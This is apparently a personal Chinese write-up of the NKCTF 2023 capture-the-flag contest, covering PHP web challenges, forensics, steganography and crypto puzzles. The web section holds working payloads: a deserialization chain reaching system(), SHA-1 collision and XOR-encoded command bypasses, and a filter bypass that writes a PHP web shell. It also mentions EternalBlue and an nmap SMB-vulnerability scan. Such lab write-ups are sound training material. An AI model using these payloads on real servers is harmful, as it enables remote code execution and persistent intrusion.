title: NKCTF2023WP
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-03-27 23:00:00
---
##### 前话
这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的
只是因为比赛是团队合作，所以就把难题留给大哥们了。
当然，这不是重点，重点是从中学到了啥。

#### WriteUp
##### Web
**BabyPHP**
```
<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'oww!man!!';
        public function __construct(){
            $this->name = 'ItS SO CREAZY';
        }
        public function __destruct(){
            if($this->name == 'welcome_to_NKCTF'){
                echo $this->arg;
            }
        }
    }

    function waf($string){
        if(preg_match('/f|l|a|g|\*|\?/i', $string)){
            die("you are bad");
        }
    }
    class Happy{
        public $shell;
        public $cmd;
        public function __invoke(){
            $shell = $this->shell;
            $cmd = $this->cmd;
            waf($cmd);
            eval($shell($cmd));
        }
    }
    class Hell0{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }

    if(isset($_GET['p'])){
        unserialize($_GET['p']);
    }else{
        highlight_file(__FILE__);
    }
?>


进行反序列化


<?php
error_reporting(0);

class Welcome
{
    public $name;
    public $arg;

    public function __construct()
    {
        $this->name = new Hell0();
    }
}

function waf($string)
{
    if (preg_match('/f|l|a|g|\*|\?/i', $string)) {
        die("you are bad");
    }
}

class Happy
{
    public $shell;
    public $cmd;

    public function __construct()
    {
        $this->shell = 'system';
        // flag*?
        $this->cmd = 'cd /;more `php -r "echo chr(102).chr(49).chr(97).chr(103);"`';
    }

    public function __invoke()
    {
        $shell = $this->shell;
        $cmd = $this->cmd;
        waf($cmd);
        eval($shell($cmd));
    }
}

class Hell0
{
    public $func;

    public function __construct()
    {
        $this->func = new Happy();
    }
}

$a = new Welcome();
echo urlencode(serialize($a));
```
**EazyPHP**
```
<?php 
    highlight_file(__FILE__);
    error_reporting(0);
    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){
        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){
            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){
                if(isset($_GET['NS_CTF.go'])){
                    if(isset($_POST['cmd'])){
                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){
                            eval($_POST['cmd']);
                        }else{
                            die('error!!!!!!');
                        }
                    }else{
                        die('error!!!!!');
                    }
                }else{
                    die('error!!!!');
                }
            }else{
                die('error!!!');
            }
        }else{
            die('error!!');
        }
    }else{
        die('error!');
    }
?> error!


其中使用[]通配符绕过


c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&cmd=("%13%19%13%14%05%0d"^"%60%60%60%60%60%60")("%03%01%14%00%00%06%00"^"%60%60%60%20%2f%60%2a");
```
**HardPHP**
```
<?php
// not only ++
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['NKCTF'])) {
    $NK = $_POST['NKCTF'];
    if (is_string($NK)) {
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$NK) && strlen($NK) < 105){
            eval($NK);
        }else{
            echo("hacker!!!");
        }
    }else{
        phpinfo();
    }
}
?>


【1】利用自增方法
NKCTF=$_=(_/_._)['$'=='_'];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[_]($$_[__]);&_=readfile&__=/flag

【2】先传Shell
NKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&___=shell_exec&_=echo '<?php eval($_POST[1])?>' >1.php
     再输出FLAG
1=echo file_get_contents('/flag');
```
**EasyPMS**
```
禅道系统存在命令执行和权限绕过漏洞，根据0Day漏洞的POC执行就行了
```
##### MISC
**Blue取证磁盘**
```
【预期解】
使用永恒之蓝攻击

【非预期解】
虚拟机直接导入
先扫出IP地址
使用nmap尝试扫描其他smb漏洞      nmap -P --script=smb-vuln*  IP
利用ms09的CVE
获取Shell然后打开

【严重非预期解】
WinHex一把嗦
```
**三体**
[老题目了](https://www.bilibili.com/video/BV1Ai4y1V7rg/)
```
from PIL import Image

def decode(im):
    width, height = im.size
    lst = [ ]
    for y in range(height):
        for x in range(width):
            red, green, blue = im.getpixel((x, y))
            if (blue | green | red) == 0:
                break
            
            index = (green << 8) + blue
            lst.append( chr(index) )

    return ''.join(lst)


def main(filename: str):
    all_text = decode(Image.open(filename))
    with open("{}_decode.txt".format('.'.join(filename.split('.')[:-1])), "w", encoding = "utf-8") as f:
        f.write(all_text)

if __name__ == '__main__':
    main('三体.bmp')
```
**THMaster东方星莲船打到10亿分**
```
【1】简简单单网上找修改器改分数
【2】CheatEngine修改游戏数据
```
**easy_rgb**
```
用Kali的工具gaps
具体指令自己网上找

然后发现三个文档
r.txt   g.txt   b.txt

按照rgb的顺序每次读一位字符得到压缩包字节流
r = "5b04000d663f400000006c6e747a434fbc7d0225c4060b2905cf0a280807372873460041100000ba56b200000000000000006c6e7400000110ea63055a596785d14500010000600745213"
g = "0040000ba56b2000000066778f4ac280276f9fb28fb3c282b4fdf7d8a0944bc722bd65b0410083a5492004008200000000006677800000008cc73d1c7630a5f595b000001500800015d38"
b = "4310083a54920040080061247309bcac200235fff7778acdfc0401090b3a37c1fcf3000204000d663f40000004000020000061247a20000004dd5985a5d14663000600000a0000004332"
data = ""
for i in range(len(r)):
	try:
		data += r[i] + g[i] + b[i]
	except:
		break
data += r[-1] + g[-1]
with open('flag.zip', 'wb') as f:
	f.write(bytes.fromhex(data))
```
**easy_word**
```
提示如下:
小明这个笨蛋，给文档设置了一个密码，但是他自己却忘记了密码，他知道以下信息：
1.密码是数学和大小写英语的随机生成的
2.hash函数：
输出大小 256 bits 内部大小 256 区块大小	512 长度大小 64 字符尺寸 32
3.密码：h??vO??0 (?号部分为小明已经忘记的位置)
  哈希：b75d1224 ... (后面不记得了...)

写脚本跑一下
import hashlib
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
for c1 in chars:
    for c2 in chars:
        for c3 in chars:
            for c4 in chars:
                password = "h{}{}vO{}{}0".format(c1, c2, c3, c4)
                hashcode = hashlib.sha256(password.encode()).hexdigest()
                if hashcode[:8] == "b75d1224":
                    print("{}   {}".format(password, hashcode))
                    
h4evOF90   b75d1224d1321f5acfe0fb499ff02ab0f15d199e227c77c84c1162340bc6c771
发现有一个图片
猜测是LSB，直接解密
```
**first_spam_of_rabbit_year**
```
文档底下的社会主义核心价值观编码解码为：rabbit 又 move
再用佛又曰得出的文本有不可显示字符
零宽解密   https://offdev.net/demos/zwsp-steg-js
将key和密文清除零宽后分别解密得到新密文
最后用rabbit解密   https://www.codeeeee.com/encrypt/rabbit.html
```
**easy_bmp**
```
修改宽并使用脚本爆破高显示出部分key
解压出一个二维码扫得flag
```
**baby_music**
```
WinHex打开发现全是1027和1127
盲猜是二进制数据，把1027改为0,1127改为1
得到一个zip，里面有脚本
压缩包的提示为摩斯密码
猜测明文攻击 echo -n "89504E470D0A1A0A0000000D49484452" | xxd -r -ps > png_header
```
**easymusic**
```
提示OpenPuff，需要三个密码
用notepad++打开音频文件发现第一个密码
Kali安装Audacity选择spectrogram进行频谱分析得到一个密码
选择波形分析，发现对应二进制的01变化，高电平表示1，低电平表示0，二进制数转换成字符串得到第三个密码
最后提取出隐藏Flag
```
**easy_pic**
```
formast分离出一个图片
010编辑器分析出隐藏数据得到一个照片
PS更改宽高得到隐藏Flag
```
##### 区块链
**Signin**
不会。

#### 最后
反正感觉这次比赛还是有很大作用的，以后继续努力（敷衍中，睡觉了）